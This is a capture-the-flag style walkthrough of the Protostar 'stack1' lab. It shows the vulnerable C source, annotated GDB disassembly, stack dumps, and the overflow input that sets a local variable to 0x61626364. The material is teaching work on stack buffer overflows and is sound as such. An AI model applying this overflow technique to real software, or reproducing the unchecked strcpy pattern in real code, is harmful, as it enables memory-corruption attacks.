## STACK ONE ##

This level looks at the concept of modifying variables to specific values in the program, and how the variables are laid out in memory.

This level is at /opt/protostar/bin/stack1

Hints

If you are unfamiliar with the hexadecimal being displayed, “man ascii” is your friend.
Protostar is little endian

### Source Code ###
```C
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];

  if(argc == 1) {
      errx(1, "please specify an argument\n");
  }

  modified = 0;
  strcpy(buffer, argv[1]);

  if(modified == 0x61626364) {
      printf("you have correctly got the variable to the right value\n");
  } else {
      printf("Try again, you got 0x%08x\n", modified);
  }
}
```
After disassemble the code, the variables can be interpreted as below
```
Dump of assembler code for function main:                                                                         
0x08048464 <main+0>:    push   %ebp                                                                               
0x08048465 <main+1>:    mov    %esp,%ebp                                                                          
0x08048467 <main+3>:    and    $0xfffffff0,%esp         <- 96 bytes allocated for stack, use only 68 bytes for local vars                                                          
0x0804846a <main+6>:    sub    $0x60,%esp                                                                         
0x0804846d <main+9>:    cmpl   $0x1,0x8(%ebp)           <- argc @ 0x8(%ebp)                                                   
0x08048471 <main+13>:   jne    0x8048487 <main+35>
0x08048473 <main+15>:   movl   $0x80485a0,0x4(%esp)
0x0804847b <main+23>:   movl   $0x1,(%esp)
0x08048482 <main+30>:   call   0x8048388 <errx@plt>
0x08048487 <main+35>:   movl   $0x0,0x5c(%esp)          <- 'modified' @ 0x5c(%esp)
0x0804848f <main+43>:   mov    0xc(%ebp),%eax           <- load argv
0x08048492 <main+46>:   add    $0x4,%eax                <- load argv[1]
0x08048495 <main+49>:   mov    (%eax),%eax              <- load *argv[1]
0x08048497 <main+51>:   mov    %eax,0x4(%esp)
0x0804849b <main+55>:   lea    0x1c(%esp),%eax
0x0804849f <main+59>:   mov    %eax,(%esp)
0x080484a2 <main+62>:   call   0x8048368 <strcpy@plt>   <- where to exploit
0x080484a7 <main+67>:   mov    0x5c(%esp),%eax
0x080484ab <main+71>:   cmp    $0x61626364,%eax         <- compare with the magic number
0x080484b0 <main+76>:   jne    0x80484c0 <main+92>
0x080484b2 <main+78>:   movl   $0x80485bc,(%esp)
0x080484b9 <main+85>:   call   0x8048398 <puts@plt>
0x080484be <main+90>:   jmp    0x80484d5 <main+113>
0x080484c0 <main+92>:   mov    0x5c(%esp),%edx
0x080484c4 <main+96>:   mov    $0x80485f3,%eax
0x080484c9 <main+101>:  mov    %edx,0x4(%esp)
0x080484cd <main+105>:  mov    %eax,(%esp)
0x080484d0 <main+108>:  call   0x8048378 <printf@plt>
---Type <return> to continue, or q <return> to quit---
0x080484d5 <main+113>:  leave  
0x080484d6 <main+114>:  ret   
```

The following lines show registers and stacks before strcpy
```
eax            0xbffff70c       -1073744116
ecx            0x3cae3384       1018049412
edx            0x2      2
ebx            0xb7fd7ff4       -1208123404
esp            0xbffff6f0       0xbffff6f0
ebp            0xbffff758       0xbffff758
esi            0x0      0
edi            0x0      0
eip            0x80484a2        0x80484a2 <main+62>
eflags         0x200282 [ SF IF ID ]
cs             0x73     115
ss             0x7b     123
ds             0x7b     123
es             0x7b     123
fs             0x0      0
gs             0x33     51
0xbffff6f0:     0xbffff70c      0xbffff941      0xb7fff8f8      0xb7f0186e
0xbffff700:     0xb7fd7ff4      0xb7ec6165      0xbffff718      0xb7eada75
0xbffff710:     0xb7fd7ff4      0x080496fc      0xbffff728      0x08048334
0xbffff720:     0xb7ff1040      0x080496fc      0xbffff758      0x08048509
0xbffff730:     0xb7fd8304      0xb7fd7ff4      0x080484f0      0xbffff758
0xbffff740:     0xb7ec6365      0xb7ff1040      0x080484fb      0x00000000 <-'modifled' variable
0x80484a2 <main+62>:    call   0x8048368 <strcpy@plt>
0x80484a7 <main+67>:    mov    0x5c(%esp),%eax

```

Let's run with the following input

```
r AAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBCCCCCCCCCCCCCCCCDDDDDDDDDDDDDDDDdcba
```
the string dcba at the end means 0x61626364 in ascii and in little endian order 

```
eax            0x61626364       1633837924
ecx            0x0      0
edx            0x45     69
ebx            0xb7fd7ff4       -1208123404
esp            0xbffff6f0       0xbffff6f0
ebp            0xbffff758       0xbffff758
esi            0x0      0
edi            0x0      0
eip            0x80484ab        0x80484ab <main+71>
eflags         0x200246 [ PF ZF IF ID ]
cs             0x73     115
ss             0x7b     123
ds             0x7b     123
es             0x7b     123
fs             0x0      0
gs             0x33     51
0xbffff6f0:     0xbffff70c      0xbffff941      0xb7fff8f8      0xb7f0186e
0xbffff700:     0xb7fd7ff4      0xb7ec6165      0xbffff718      0x41414141
0xbffff710:     0x41414141      0x41414141      0x41414141      0x42424242
0xbffff720:     0x42424242      0x42424242      0x42424242      0x43434343
0xbffff730:     0x43434343      0x43434343      0x43434343      0x44444444
0xbffff740:     0x44444444      0x44444444      0x44444444      0x61626364 <-'modified' changes
0x80484ab <main+71>:    cmp    $0x61626364,%eax
0x80484b0 <main+76>:    jne    0x80484c0 <main+92>

```

and the result
```
Continuing.
you have correctly got the variable to the right value
```









